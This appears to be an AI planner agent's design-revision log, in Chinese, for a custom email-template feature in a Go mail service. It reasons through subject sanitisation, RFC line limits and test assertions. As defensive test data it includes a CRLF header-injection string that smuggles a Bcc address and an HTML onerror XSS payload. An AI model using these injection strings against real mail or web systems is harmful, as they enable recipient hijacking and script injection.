---
ts: 20260826-154500
agent: planner
action: plan-r4
tree: 2d0c1a9b7f9dcd9d0f5bb2f9dbf1a7cbe4c5f6de
server_tree: df4673314cd5d89d4c6696b8abd422a5db0f143e
verdict: FROZEN
---

# 方案 r4：给自建部署一个「只有运维方能写、写坏了也只会退回内置模板」的对外邮件模板机制

BASE `f74a71060fcdd45318cae6fb7caf7c0d7e71cdfa`（tree `57e81be90cc49effdc55aa2f06f16aef35689aba`），
分支 `feature/email-template-customization`。本分录中所有行号均针对该 BASE。

本文**取代** `planner/20260826-134000-plan-r3.md`（sha256
`025d33e6…b342ac`，于 20260826-145500 核对 PASS、20260826-150500 经人工闸门 1 放行，
**于 20260826-152000 因 `PG16` 解冻**，见 `leader/20260826-152000-gate-pg16-route.md`）。
账本 append-only，r1 / r2 / r3 连同各自的 gate 分录一律原样保留。r4 是完整方案，可独立阅读，
不需要对照 r1、r2 或 r3。

**stage 2 的执行依据 = 本文 + `leader/20260826-150500-gate1-approved.md`。**
后者的两条追加约束已按下述方式在本文就地落地：追加约束二成为独立一节（§5.2），
追加约束一的责任与落点写进交接段（§14）。

**关于 front matter 的 `tree` 与新增的 `server_tree`（M-L17 的处置，r4 新增）**：
`tree` 记的是**写本分录时 HEAD 的全仓 tree**（即上一条提交后的状态）；纯账本提交每次都会改变它，
所以它不适合用来做「结论与代码一致」的绑定。`server_tree` 记的是**业务子树** `HEAD:server`，
自 BASE 起未变（`df467331`），这才是 stage 2 真正该核对的锚点。调度在 M-L17 里建议把
tree 列定义固定下来，我这里先用两个字段把两种读法分开，不再让一个字段承担两个含义。

**产物形态说明（沿用卡片 20260826-130731 的修订要求，r3 M16 已实证有效）**：本文由 `cp` r3 后
**定点编辑**得到，未在下方「r3 → r4 变更清单」（§14）中列名的章节是**文件复制的结果**，
逐字节与 r3 相同，可用 `git diff` 机械验证；编辑过程按处分段 commit + push。

**范围**：`PG16` 裁决（验证码模板数据白名单）、硬规则第 3 条重写为单一可机械执行判据、
**全部**模板数据结构与主题模板的逐元素回归（不只修被点名的那一个）、追加约束二成节、
`PG15` 处置、交接段点明追加约束一的责任。
**不重开路线 A**，不重开 `PG1`（剥控制字符契约）、`PG2`（三时机分离）、`PG3`–`PG14` 的裁决，
不重开闸门 1 对 `Q1`–`Q4` 与 `Q5a`/`Q5b` 的裁决。放行人在 20260826-150500 已明确
「其余裁决我复核后维持……全部维持，不重开」，调度在 20260826-152000 §3 复述并划定了同一条边界。

---

## 0. 裁决存档与本次修订

本节分三段读：

- **§0.1–§0.3 是 r2 的裁决（PG1、PG2 与全文自洽复查产出的 PG3–PG9），原文保留、继续有效。**
  调度在 `leader/20260826-123504-gate-plan-r2.md` 中逐条复算后确认全部成立，r3/r4 不重开。
  它们留在这里是因为方案必须可独立阅读——实现不该为了知道 `=0D=0A` 为什么不是预期值而去翻 r2。
- **§0.4–§0.7 是 r3 的裁决**：PG10、PG11、两处行号订正（一处采纳、一处不采纳并给出理由）、
  以及 §8 全量数字复算过程中新发现的三处（PG12–PG14）。调度在
  `leader/20260826-145500-gate-plan-r3.md` 中逐条复算 PASS，原文保留、继续有效。
- **§0.8–§0.10 是 r4 的本次修订**：PG16 裁决与硬规则第 3 条的重写（§0.8）、
  对**全部**模板数据字段与主题模板做同样逐元素回归所新发现的三处 PG17–PG19（§0.9）、
  PG15 处置（§0.10）。

**本轮的错误形态与前两轮又不同，这一点值得单独记下来。** r2 修的是**结构**（断言指向了管线上
错误的位置）；r3 修的是**数字**（结构对、位置对，但具体值错）；r4 修的是**契约的封闭性**——
§7.1 声明了一份「一个字段都不多」的封闭白名单，然后在同一节里给出了一份不满足它的清单。
结构对、数字对、每个字段单独看也都说得通，错的是**清单作为一个整体不满足它自己声明的性质**。
这类错误读一遍读不出来，只能**逐元素**去对：把清单里的每一个元素拿去 BASE 找现有落点。
调度在 M-L18 里已经把这条升格为对核对方的判据；§0.9 是我对自己的同一次执行，
而它又抓出了三处（PG17–PG19），说明「只修被点名的那一个」确实不够。

### 0.1 PG1 裁决：**选项 1——渲染后剥离控制字符**，T08 的 `=0D=0A` 预期删除

**裁决**：自定义主题的管线定为

```
模板渲染 → 剥离控制字符（unicode.IsControl）→ 200 rune 上限 → 998 octet 上限 → 交通道
                                                                    ↑ 通道分叉点在这之后
```

`=0D=0A` 不再是任何验收项的预期值。T08 的预期改为 `HiBcc: evil@example.com`（见 §8 T08）。

**为什么不是选项 2（保留 CR/LF 交给 `QEncoding`）——三条实测理由：**

**理由一：选项 2 依赖的隐式前提是假的。** 调度在路由分录里点出，选项 2 的安全性建立在
「`QEncoding` 必然触发」这一隐式前提上，要求 r2 把它写成显式不变量。**我写不出来，因为它不成立。**

Go 的触发判据（`/usr/local/go/src/mime/encodedword.go:42-49`）：

```go
func needsEncoding(s string) bool {
	for _, b := range s {
		if (b < ' ' || b > '~') && b != '\t' {   // ← TAB 被显式豁免
			return true
		}
	}
	return false
}
```

我的实测（§12 探针 A）：

```
A U+0009 IsControl=true  Q="Hi\tThere"              ← 原样穿过，未编码
A U+000D IsControl=true  Q="=?utf-8?q?Hi=0DThere?="
A U+000A IsControl=true  Q="=?utf-8?q?Hi=0AThere?="
A U+007F IsControl=true  Q="=?utf-8?q?Hi=7FThere?="
A U+000B IsControl=true  Q="=?utf-8?q?Hi=0BThere?="
```

TAB 是 `unicode.IsControl` 为真的控制字符，`QEncoding` 却原样放行。所以选项 2 能写出来的
最强不变量只能是「`QEncoding` 对**除 TAB 外**的控制字符必然触发」——一个带例外的防线，
而例外恰好落在唯一一个不会被编码的控制字符上。TAB 单独出现在 header 值里是合法的 WSP，
本身不构成注入，但**一条要靠「必然触发」成立的不变量，不能带例外**。选项 1 无此问题：
`unicode.IsControl` 把 TAB 一并剥掉。

**理由二：选项 2 的防线是通道相关的，选项 1 不是。** `QEncoding` 只存在于 SMTP 通道
（`email.go:292`）。Resend 通道（`:359`/`:400` → `Emails.Send`）**没有任何本地编码**——
这是 r1 §3.3 自己记下的事实（「主题落到 Resend｜无本地编码｜依赖 Resend 侧过滤」）。
INV8 要求两条通道拿到**同一份**渲染结果，所以选项 2 之下，那条带裸 CRLF 的主题会原样交给
第三方，我方的防护为零，全靠 Resend 自己过滤。选项 1 的剥离发生在**通道分叉之前**，
两条通道由我方同一段代码覆盖。

**理由三：选项 2 会让自定义路径比内置路径更弱。** 今天每一段进入主题的用户可控文本都先过
`sanitizeSubjectField`（剥控制字符），且发生在通道分叉之前。选项 2 让运维方写的主题在同一个
sink 上享受比工作区名更弱的处理——这与 F3 第 1 条（既有部署零变更优先）所体现的取向相反，
对上游也不好解释。

**需要说清的一点**：就 CRLF **这一个** case 而言，两个选项都不产生 header 注入。
我实测把选项 2 的输出装进完整 header 块交给 `net/mail.ReadMessage`（§12 探针 P8），
解析成功、无 `Bcc` header、Subject 就是那个 encoded-word。**所以这次裁决不是在两个安全性
不同的方案里选安全的那个，而是在两条契约里选能写成无例外不变量、且覆盖两条通道的那条。**

**根因登记**：`=0D=0A` 是一句关于 `QEncoding` **孤立行为**的真观察，在 §7.1 里被写进括号，
又被 T08 从括号升格成管线**末端**的验收预期。观察为真，位置错了——中间隔着一步会让它失效的
剥离。r2 已删除该括号（§7.1 改写），并在 §0.3 把这条写作纪律全文执行了一遍。

### 0.2 PG2 裁决：**三个时机分离**——解析期回落 / 启动期只告警 / 运行期回落

**裁决**：放弃「未知字段在解析期失败」这个不存在的机制，也**不采纳**「零值预执行决定是否回落」，
改为下面这套三时机分工。**T14 从「解析期失败」改写为「启动期告警 + 运行期回落」。**

| 时机 | 检测什么 | 是否改变「用哪份模板」 | 依据 |
|---|---|---|---|
| **解析期**（`Parse`） | 语法错误 | **是**——该文件回落内置，启动告警 | `Parse` 只做语法分析，与数据无关，判断**可靠** |
| **启动期零值预执行**（`Execute(io.Discard, zeroValue)`） | 未知字段、明显写错的表达式 | **否**——只发一行告警，模板照常启用 | 既不 sound 也不 complete，只能当诊断，不能当判据 |
| **运行期**（每次发送 `Execute` 到 `bytes.Buffer`） | 一切执行期错误 | **是**——本次发送回落内置，邮件照常发出 | 覆盖完全、无假阳性，是唯一权威机制 |

**为什么零值预执行只能是告警——实测（§12 探针 P5）：**

```
P5 unknown-field  zeroExec=true  realExec=true    ← 想要的：{{.SMTPPassword}} 两边都报错
P5 false-positive zeroExec=true  realExec=false   ← {{slice .Code 0 3}}
P5 false-negative zeroExec=false realExec=true    ← {{if .Code}}{{slice .Code 0 99}}{{end}}
P5 ok             zeroExec=false realExec=false
```

- **假阳性**：`{{slice .Code 0 3}}`（取验证码前三位分组显示，是运维方会真写的东西）在零值下
  `index out of range: 3`，在真实数据下完全正常。若让预执行决定回落，这个**能用的模板会被
  永久停用到下次重启**，运维方看到的是「我的模板没生效，日志说 index out of range」。
  这正是 F3 第 2 条（不因新校验让原本能用的部署失败）要避免的形态——只不过失败的不是启动，
  是功能。
- **假阴性**：`{{if .Code}}{{slice .Code 0 99}}{{end}}` 在零值下 `if` 为假、整段跳过、检查通过，
  真实数据下才炸。所以预执行给出的「通过」也不能当保证。

**既不 sound 也不 complete 的检查，不能拿来做判据；但它能抓到最常见的那一类错误**——
把字段名拼错（`{{.Code}}` 写成 `{{.VerificationCode}}`），零值下必报。所以保留它，
**降级为诊断**：发一行告警，不改变模板选用。这样假阳性的代价从「功能被停用」降到「多一行日志」，
假阴性也不再是问题，因为它本来就不承担保证。

**为什么不做 parse tree 静态遍历**：技术上可行（`t.Tree.Root` 可达），但要正确实现必须建模
`{{with}}` / `{{range}}` / `$var` 下的 `.` 重绑定——实测 `{{with .Code}}{{.}}{{end}}` 的树里
那个 `{{.}}` 指的是 `.Code` 而非根（§12 探针 P5b）。那是给模板语言的一个子集写类型检查器，
是本方案从未描述过的新子系统；而且它一旦写错就**fail closed**——把合法模板判坏、静默降级，
和零值预执行的假阳性是同一种伤害，只是错误来源变成了我们自己的校验器。收益（把一个诊断
提前）远小于代价。**明确排除，列入 non-goal 9。**

**与 T15 的覆盖边界（这是调度要求正面回答的）：**

> **启动期预执行不承担任何覆盖保证**，它是诊断。**运行期 `Execute` 失败（T15）是唯一决定
> 回落的机制，覆盖 100% 的执行期错误，且不存在假阳性**——因为它用的就是真实数据，
> 失败即真失败。二者不是「两道防线分工」，是「一道防线 + 一个提示」。

**§7.1 规则 1 的结论保留，理由改写。** 结构体仍然优于 `map[string]any`，但正确的理由是：
map 上未知字段静默成空值，**发出去一封残缺邮件而没有任何信号**；结构体上是硬错误，
**必然触发运行期回落，收件人拿到的是完整的内置邮件**。差别不在检测时机，在失败形态——
静默残缺 vs 明确回落。（附带收益：结构体让启动期零值预执行这个诊断成为可能，map 做不到。）
INV5 相应改写为三时机版本（见 §5）。

### 0.3 全文自洽性复查：把 §5 每条不变量与 §8 每条验收项两两对照

按调度给的判据执行：**凡验收项断言了某个具体字节或某个具体错误时机的，回到不变量规定的
处理管线里确认该断言可达。** 逐条走完 INV1–INV10 × T01–T21。

**结论：除 PG1、PG2 外，另发现 7 处不自洽，编号 PG3–PG9，全部已在 r2 内修订。**
（这个结论本身是复查的产物，不是「顺便发现」——PG3/PG4/PG5 与 PG1/PG2 是同一种形态，
说明这一类错误在 r1 里是系统性的，不是两次偶然。）

| # | 交叉处 | 断言了什么 | 为什么不可达 | 处置 |
|---|---|---|---|---|
| **PG3** | A4 / INV2 × T11 | 「截断到 200 rune」 | 断言可达，但**后果**没查：200 个 CJK rune 经 `QEncoding` 后 `Subject:` 整行 **2185 octet**，超 RFC 5322 的 998 上限 1.2 倍。`QEncoding` 的 `splitWord` 写的是**空格不是 CRLF**（`encodedword.go:173-178`），不会折行，就是一条超长行 | 新增 INV11：`Subject:` 整行 ≤ 998 octet，超出则继续按 rune 截断。**这一条改变了 Q3 裁决的实际效果，作为 Q5 交闸门 1 确认**（§2） |
| **PG4** | INV6 / INV7 × T06/T07/T09/T10 | 正文里出现 / 不出现某个具体字符串 | 抓到的 DATA 是 **quoted-printable 编码后**的字节，不是渲染结果。实测 `&lt;img src=x onerror=alert(1)&gt;` 在 QP 里变成 `&lt;i=\r\nmg src=3Dx onerror=3Dalert(1)&gt;`（`=`→`=3D`，且 76 列软换行把它劈开）。且 BASE 的 mock relay **不广播 8BITMIME**，`has8Bit` 恒为 false，QP 是唯一被跑到的分支 | 全部正文断言改为「**解码后**断言」；harness 必须用 `textproto` 的 DotReader 读 DATA（否则 dot-stuffing 会把 `.` 行读成 `..`）；新增 `Advertise8BITMIME` 开关，关键用例双分支各跑一次 |
| **PG5** | INV4 × T01 | 「与内置版本**逐字节**相同」 | 不可达：header 块里 `Date:` 和 `Message-ID:` 都取自 `time.Now()`（`email.go` header 块），每次不同，无法与已知期望串逐字节比对 | 改为「掩蔽 `Date:` / `Message-ID:` 两个字段后逐字节相同」，并把这两个字段单独断言为「存在且格式合法」 |
| **PG6** | INV3 / P09 × 新主题管线 | P09 `sanitizeSubjectField`「不修改，仅新增调用者」 | 新路径需要「剥控制字符 + 200 rune」，`sanitizeSubjectField` 给的是「剥控制字符 + 60 rune」，**新路径根本没法调用它**。r1 写「不修改仅新增调用者」与 INV2 写「同样先剥控制字符」之间没有可行的实现 | 新增平行函数 `sanitizeRenderedSubject`，`sanitizeSubjectField` 保持零 diff（沿用 §4.3 对 `buildInvitationParams` 的同一取舍）；新增防漂移对照测试 T22 |
| **PG7** | INV5 × T12/T13 | 「**恰好一行**启动告警」 | `NewEmailService` **无论如何都会打印一行**通道选择日志（`EmailService: SMTP relay …` / `Resend API …` / `DEV mode …`，`email.go:227-238`）。按字面断言「恰好一行」必然失败 | 改为「模板相关告警**恰好一条**」，并指定输出流（见 §7.3：统一用 `fmt.Printf` → stdout，与 `email.go` 既有范式一致） |
| **PG8** | INV1 × T16 | 「全量 stdout+stderr 中不含该次验证码」 | 断言可达但**会假绿也会假红**：6 位数字在时间戳等噪声里可能偶然出现（假红），也可能因为测试用的 code 恰好不 distinctive 而失去意义 | 固定哨兵验证码 + 双向断言（哨兵不出现 + 一条构造性反例证明探针确实会变红），见 T16 |
| **PG9** | INV8 × T17 | 「两条通道的 Subject 与 HTML **完全相同**」 | 只在 **sink 之前**为真。到线上 SMTP 侧 Subject 过 `QEncoding`、正文过 QP，Resend 侧两者都不过——wire 级永远不同 | 明确观测点为「交给 `sendSMTP` / 装进 `SendEmailRequest` 的那两个字符串」，并补一句说明 wire 级差异是预期的 |

**另外修订的三处事实性错误（不构成冲突，但会误导实现）：**

- r1 §3.3 写 `QEncoding` 使 CRLF「**不可能**以裸 CRLF 进入 header 块」——结论对，但表述掩盖了
  TAB 豁免（§0.1）。r2 §3.3 已改写。
- r1 T19 的命令写 `cd server && bash ../scripts/test-go.sh --race`，引 `ci.yml:534`。
  实测脚本自己 `cd "$REPO_ROOT/server"`，两种调用都能跑；CI 里那一行是 **`ci.yml:535`**，
  内容 `run: bash scripts/test-go.sh --race`。已订正。
- r1 §4.4 U3 记「#7577 未合入，`upstream/main` HEAD == BASE」。**本轮复算：HEAD 已前进到
  `09a2410e882be8435bd6c4a26e03f7e288038203`（BASE 之后 1 个 commit，`#7592` 重命名
  `starter_prompts`→`conversation_starters`），BASE 仍是其祖先。**该 commit 与本次 write_set
  **零重叠**（已 `git diff --name-only` 核对），`refs/pull/7577/head` 仍为 `155a2c72`，
  `email.go` / `email_test.go` 自 BASE 起未被触碰——**#7577 仍未合入，U3 结论不变，依据已更新为本轮实测**（§12 探针 U）。

**写作纪律，本文全文执行**：任何一句「实测…」在被升格为验收项之前，必须确认那次实测的输入
与最终管线在该点的输入相同。§12 每条证据都标注了它在管线上的**位置**；§8 每条断言都标注了
**观测点**。PG3/PG4/PG5/PG9 都是这条纪律的直接产物。

**（r3 补充）这条纪律漏了一半，PG10 就是从漏掉的那一半钻进来的。** r2 要求标注「实测的输入
位置」，但没要求标注**实测所用的阈值与构造**。§12 探针 D 的输入位置是对的（管线末端 P11→P12），
错的是它用了一个 900 的阈值，而 INV11 规定的是 998。r3 把纪律补全为三项：**位置 + 阈值 + 构造**，
见 §0.4 与 §12 开头的新增说明。

### 0.4 PG10 裁决：CJK 主题在 998 octet 之下的有效长度是 **91 rune**，「~81」的来源已查明

**先复算，不采信调度给的数字。** 用与 INV11 完全相同的度量口径
`len("Subject: " + mime.QEncoding.Encode("utf-8", s))`（不含 CRLF，`len("Subject: ") == 9`）
独立跑一遍（§12 探针 R1）：

```
CJK n= 90 ->  987 octet  fits998=true
CJK n= 91 ->  996 octet  fits998=true      <- 998 之下的最大 rune 数
CJK n= 92 -> 1018 octet  fits998=false
```

**结论与调度一致：91，不是 81。** r2 的「~81 rune」「约 80 字」是错的。

**81 是怎么来的——不是另一种合理口径，是探针与不变量用了不同的阈值。**
r2 §12 探针 D 的原文逐字是：

> `D largest all-CJK subject under 900 octets = 81 runes (line=893)`

「under **900** octets」。而 INV11 规定的是 **998**。我把阈值当参数扫一遍（§12 探针 R1）：

```
T=900 -> max all-CJK n = 81 (line=893)     <- r2 §12 记下的就是这一行
T=998 -> max all-CJK n = 91 (line=996)     <- INV11 真正需要的那一行
```

**81 是一个正确的观测，被填进了一个它不适用的槽位。** 探针跑的是 900，方案正文引用它时写成了
998 之下的结论，然后这个数字扩散到五处（§1.4 A7、§2 Q5 背景、§5 INV11、§8 T21/T23、
§11 L3 `must_answer` 6）。900 这个数从哪来无从考证——探针源码已删，§12 只留了输出，
这本身就是 PG13（§0.7）。

**所以调度那句「度量口径本身需要在 INV11 里写死，这比订正数字更重要」是对的，但还要再进一步。**
真正出问题的不是口径（`len("Subject: " + Q(s))` 从 r2 到 r3 一字未改，探针与不变量用的是同一个），
是**阈值**。口径写死了、阈值没写死，一样会再出一次 PG10。r3 的处置是三条，缺一不可：

1. **INV11 里同时写死度量口径与阈值**，并写出「这两者必须与探针使用的完全一致」这句约束（§5）。
2. **§12 每条数值证据必须记录：位置 + 阈值 + 构造**（§12 开头新增说明）。只记输出等于交出一个
   不可复算的数——PG10 与 PG13 都是这么来的。
3. **T23 断言精确值 91 而不是「~81 附近」**（§8）。r2 写「~」是因为它知道自己不确定；
   而这个值对固定字符集是**完全确定**的，写「~」本身就是一个应该被追问的信号。

**「91」不是一个数，是一族数——这一点必须写进文档面，否则 T21 会再犯一次同型错误。**
有效长度取决于主题的字符构成（§12 探针 R1/R5）：

| 主题构成 | 998 之下的最大 rune 数 | `Subject:` 行 octet |
|---|---|---|
| 纯中文 `中` / 纯日文 `語` / 纯韩文 `한`（任意 3 字节 UTF-8 字符） | **91** | 996 |
| 中日韩字符 + 每 8 个插一个空格（更接近真实主题） | 99 | 998 |
| Emoji（纯 4 字节，如 U+1F600，12 octet/rune） | **67** | 994 |
| 纯 ASCII | **200（即 200 rune 上限先生效，octet 规则完全不触碰）** | 209 |
| `é`×122 + `a`×76（混合宽度，§0.5 用到） | 198 | 998 |

（r4：原「Emoji 混入 3 字节符号 = 71」一行**已删除**，其构造从未记录、今天复算不出来，
见 §0.10 PG15。混排的具体值随构造变化，不进本表也不进文档面。）

**91 是 3 字节 CJK 的精确值，同时是常见主题的下界**——任何 ASCII 字符、空格或标点都会把它抬高。
文档要写的是「**纯中日韩主题约 91 字**；含空格与 ASCII 时更长；纯 ASCII 主题 200 字不受影响」，
而不是一个孤零零的数字。r2 的 T21 要求把「约 80 字」写进四语言文档，那既是错值，
也是错的表达形态。

**量化步长（顺带确认，也是 PG11 的依据）**：每个 3 字节 CJK 字符占 9 octet（`=XX` ×3），
在 encoded-word 边界一次跳 22 octet（`?=` + 空格 + `=?utf-8?q?`）：

```
n=89 -> 978 (+9)   n=90 -> 987 (+9)   n=91 -> 996 (+9)
n=92 -> 1018 (+22) <- encoded-word 从 13 个变 14 个
```

**论证方向不受影响**：200 → 91 仍然是显著压缩，Q3 裁决的实际效果仍然被 INV11 改变，
所以 Q5 仍然必须交闸门 1（§2）。变的是数字与 Q5 的问法（§0.4 末尾 + §2）。

**Q5 要不要换问法——要，而且不只是换数字。** 详见 §2，这里给结论：拆成 Q5a / Q5b 两问。
r2 的 Q5 只问「上限值取多少」，这**预设了「要有这条上限」已经成立**；而 §9 可证伪条件 10 与
L3 `must_answer` 6 都在质疑这个前提（U7 未验证：真实 MTA 对超长 `Subject:` 行的处置不明，
且内置路径今天就产出 1349 octet 从未有人报障）。把一个自己写在可证伪清单里的前提，
在唯一的确认项里悄悄当成已定，是不诚实的提法。r3 让「要不要这条上限」显式出现在发起人面前，
并给出明确推荐（要）。

### 0.5 PG11 裁决：**采纳方向 (b)**——T24 改写为「最长满足前缀」的不动点性质，另加一条**运行期推导**的精确边界

**先确认 finding 成立。** r2 的 T24 要求「主题模板渲染出**恰好使 `Subject:` 行等于 998 octet**
的内容」。在 r2 自己规定的管线（先 200 rune、再 998 octet）与 T23/Q5 通篇使用的字符集里，
这个点不可达（§12 探针 R2）：

```
纯 CJK，n ∈ 1..400，命中 998 的 rune 数：无     （9 octet 步长 + 边界跳 22，998 被整个跳过）
纯 ASCII，命中 998 需 n=989                     （但 200 rune 上限先生效，200 ASCII = 209 octet）
```

调度的混合宽度构造我也逐字复算通过：`22×"é" + 63×"中" + 109×"a"` = 194 rune → **恰好 998**，
再接一个 ASCII rune → 999。**所以 998 不是绝对不可达，只是在方案自己使用的语境里不可达。**
这与实现前两次开工即停同型：判据在管线里做不到。

**裁决：采纳 (b)，不采纳 (a) 的「把构造串写进 T24」，但保留一条运行期推导的精确边界用例。**

采纳 (b) 的理由，前两条是调度给的，第三条是我复算时才确认的：

1. **(a) 会把一个偶然的构造固化进测试。** `22é+63中+109a` 里没有任何一个数字有含义，
   它们是 Go 的 Q-encoding 量化步长与 encoded-word 折断位置的巧合产物。写进测试后，
   任何人都无法判断改动它是否安全——这正是 §12 探针 D 只留输出不留构造所造成的伤害
   （PG10/PG13），不该在验收里再造一次。
2. **(b) 顺带把量化步长这个事实覆盖了**：断言「再接一个 rune 必然超限」在 CJK 上就是断言
   996 → 1018 这一跳，而这一跳正是 998 不可达的原因。
3. **（复算新增）(b) 的前提我验证过了，它成立。** 「最长满足前缀」这个说法只有在
   `subjectLine` 对 rune 前缀**单调不减**时才良定义——否则「最长的满足者」可能不唯一、
   也不能二分。实测（§12 探针 R2）：5 个字符集（ASCII / Latin-1 / CJK / Emoji / 混合）
   × 4000 条随机串 × 每条的每个前缀，**非单调步数 = 0**。
   我在 r3 里把这条单调性写成 INV11 的显式前提（§5），因为不动点性质整个压在它上面，
   而 r2 从来没有陈述过它。

**不采纳 (a)，但也不放弃精确边界——`≤` 写成 `<` 这个 off-by-one 必须被回归覆盖。**
处置是：让**测试自己在运行期推导**出一个恰好命中上限的串，而不是把常量写死。
推导必须是确定性的、且允许「推导不出」：

```go
// 双参数枚举：宽字符 × 窄字符，按固定顺序取第一个命中的组合。
// 找不到就 t.Skip —— 「998 是否可命中」是 Go 编码器的性质，不是我方代码的性质。
func deriveExactBoundary(wide, narrow string, target, maxRunes int) string
```

实测这个枚举确实能推出解，且第一个成功的组合是确定的（§12 探针 R3）：

```
wide="中" narrow="a"  -> 200 rune 内不可达        <- 这正是 PG11 的内容，被枚举确认
wide="é"  narrow="a"  -> 122×é + 76×a = 198 rune, line=998 ; +1 -> 999
wide="😀" narrow="a"  ->  56×😀 + 136×a = 192 rune, line=998 ; +1 -> 999
```

**为什么这样比 (a) 好**：串是推导出来的，改了截断实现或换了 Go 版本，推导跟着变；
而写死的常量会在编码器行为变化时静默失效（它仍然是一个合法字符串，只是不再等于 998）。
**为什么允许 Skip**：若将来 Go 改了 Q-encoding 的折行位置导致 998 在 200 rune 内彻底不可达，
这条用例应当消失而不是变红——它测的是我方截断函数的边界处理，不是编码器的取值分布。
不动点性质（T24a）在那种情况下仍然全覆盖。

T24 的新全文见 §8。要点：T24a 断言四条性质（满足上限 / 是 rune 对齐的前缀 / 极大 /
幂等，且输入本就满足时原样返回），T24b 断言运行期推导出的精确边界，
量化步长那一跳并入 T23（996 → 1018）。四条性质在 20000 条随机输入 × 5 个字符集上
**违反数 = 0**（§12 探针 R2）。

### 0.6 两处行号订正：一处采纳，一处**不采纳**并给出证据

调度声明这两条「不构成返工理由，顺手改」。我逐条读了源码：

**采纳：`auth.go:341` → `handler/auth.go:340`。** 调度是对的。

```
handler/auth.go:340   code, err := generateCode()
handler/auth.go:341   if err != nil {
handler/auth.go:346   ... CreateVerificationCode ...
handler/auth.go:356   ... SendVerificationCode ...
handler/auth.go:357   slog.Error(..., "email", email, "error", err)    <- 不记 code
```

r2 在 §3.5 与 §4.2 P03 各引一次，均已订正（`:341` → `:340`，`:341-360` → `:340-360`）。
`generateCode()` 本身在 `handler/auth.go:114-121`，`return fmt.Sprintf("%06d", n)`——
r3 顺带把这个出处补进 R1，因为 R1 声称「6 位数字」却只引了注释的行号。

**不采纳：`email.go:227-238` → `:229-238`。我读到的是 `:227-238` 正确。**

```go
227	switch {
228	case smtpHost != "":
229		tlsLabel := "starttls"
230		if smtpTLSImplicit {
231			tlsLabel = "implicit-tls"
232		}
233		fmt.Printf("EmailService: SMTP relay %s:%s (%s) from=%s\n", smtpHost, smtpPort, tlsLabel, from)
234	case client != nil:
235		fmt.Printf("EmailService: Resend API from=%s\n", from)
236	default:
237		fmt.Println("EmailService: DEV mode — codes printed to stdout (set MULTICA_DEV_VERIFICATION_CODE in .env for a fixed local code)")
238	}
```

R12 断言的是「`NewEmailService` **无条件打印一行**通道选择日志」，其证据是**整个 `switch`
三分支全覆盖**——这个性质由 `227` 的 `switch {` 与 `238` 的 `}` 共同界定。
`229` 是 `tlsLabel := "starttls"`，一个分支内部的局部变量赋值，它不划定任何东西；
从 `229` 起引，读者看到的是一个没有开头的 `switch`，恰好丢掉了「三分支穷尽 ⇒ 无条件」
这个论证的关键。

**所以这不是「哪个行号更准」的问题，是「行号引用要覆盖被断言的性质」。** 我保留 `:227-238`，
并在 §1.2 R12 里把这条理由写进去，免得下一轮再被当成笔误改掉。
若调度看到我没看到的证据（例如 227/228 在某个 revision 下不同），请在核对时指出，
我按证据改——**但我不按结论改**。这条记进 §13 M17。

### 0.7 复算过程中新发现的三处（PG12–PG14）

调度要求「§8 中出现的每一个具体数字，逐个跑一次探针确认」。本轮确实又抓出三处，
且**没有一处来自阅读，全部来自重跑**——这一点本身是 §13 M16 的实证。

| # | 位置 | r2 写的 | 实测 | 处置 |
|---|---|---|---|---|
| **PG12** | §1.2 **R9** | 「`server/` 下**没有任何** `html/template` / `text/template` 的生产用法」，依据「全仓 grep」 | **`server/cmd/multica/help.go:6` 生产代码 `import "text/template"`**（另有 `cmd_daemon_test.go:15` 在测试中）。只有 `html/template` 才是 `server/` 首次 | R9 改写为「`html/template` 首次；`text/template` 已有一处生产用法（`help.go:6`）」；§6 方案 A 的代价条目同步改写。**这条影响的是代价陈述的可信度**——R9 是方案 A 的三条代价之一，被上游 review 一眼证伪比数字错更贵 |
| **PG13** | §12 探针 D 第二行 | `largest ascii+1nonascii subject under 900 octets = 301 runes (line=379)` | 在我能复现的构造下，T=900 得 **731 runes (line=900)**，T=998 得 **814 runes (line=996)**。**301/379 在任何阈值下都复现不出来** | 该行删除，代之以记录了**完整构造**的新数据（§12 探针 R1）。根因与 PG10 同源：§12 只记输出、不记构造与阈值，导致这个数**无法被任何人复算，包括我自己**。§12 开头新增「位置 + 阈值 + 构造」三项要求 |
| **PG14** | 三处行号精度 | P29 `email_test.go:502-624`；§3.6 `testSMTPServer` `:502-515`；R14 EHLO `:562-578` | `handleConn` 实际 `:544-638`（P29 的写集要覆盖到 638）；`testSMTPServer` 结构体 `:502-514`；EHLO 应答块 `:570-577` | 逐处订正。P29 那处有实际后果：写集少写 14 行，实现按 `:502-624` 去改 harness 会漏掉 `handleConn` 的收尾 |

**另有一条不构成 gap、但会让实现浪费时间的实现陷阱，补进 §14 提醒（不占 PG 编号）：**

R-OBS-1 要求「用 `textproto` 的 DotReader 读 DATA，再按 CTE 解 quoted-printable」。
实测（§12 探针 R4）这条要求是**充分且必要**的，但它有一个反直觉的副作用：

```
DotWriter：bare "\n" -> "\r\n"，前导 "." -> ".."，Close 补 ".\r\n"
DotReader：CRLF -> LF（把行尾改回裸 \n），".." -> "."
```

**`DotReader` 会把 CRLF 改回裸 LF**，所以读回来的字节里 header 与 body 的分隔符是 `"\n\n"`
而**不是** `"\r\n\r\n"`。按后者去切分会拿到 `-1`。这一点在 r2 里没有任何地方写到，
而 T01/T05/T05b/T09/T10 全都要切分 header 与 body。

**好消息是这两个变换互为精确逆**：实测同一份含裸 `\n`、含孤立 `.` 行、含 `=`、长度跨过
76 列软换行的正文，走 8bit 分支与走 quoted-printable 分支，**经 DotReader（+ QP 解码）
之后与 Go 源码里的字面量逐字节相同**（§12 探针 R4）：

```
8bit 解回 == qp 解回                 : true
8bit 解回 == 原始 Go 字符串（裸 \n） : true
```

所以 T01 的「逐字节相同」与 T05b 的「与 T05 解码后相同」**都是可达的**，前提是严格照
R-OBS-1 做。若有人图省事直接读 socket 字节，拿到的是 CRLF 版本，两条断言都会假红。

### 0.8 PG16 裁决：**出路一——删掉 `verificationTemplateData.AppURL`，维持硬规则**

#### 0.8.1 事实（我自己重查，不引用他人结论）

| # | 断言 | 复算方式 | 结果 |
|---|---|---|---|
| 1 | `FRONTEND_ORIGIN` 在 `email.go` 全文只出现一次 | `grep -n FRONTEND_ORIGIN server/internal/service/email.go` → 仅 `:369` | 成立 |
| 2 | `:369` 位于 `SendInvitationEmail` 内 | 读 `:366-380`，`func (s *EmailService) SendInvitationEmail` 起于 `:368` | 成立 |
| 3 | 验证码路径不渲染任何 URL | 读 `:340-364`：正文由 `fmt.Sprintf` 拼 `code` 与三句固定文案，无 `href`、无 `%s` 承接 URL；主题两处均为字面量 `"Your Multica verification code"` | 成立 |
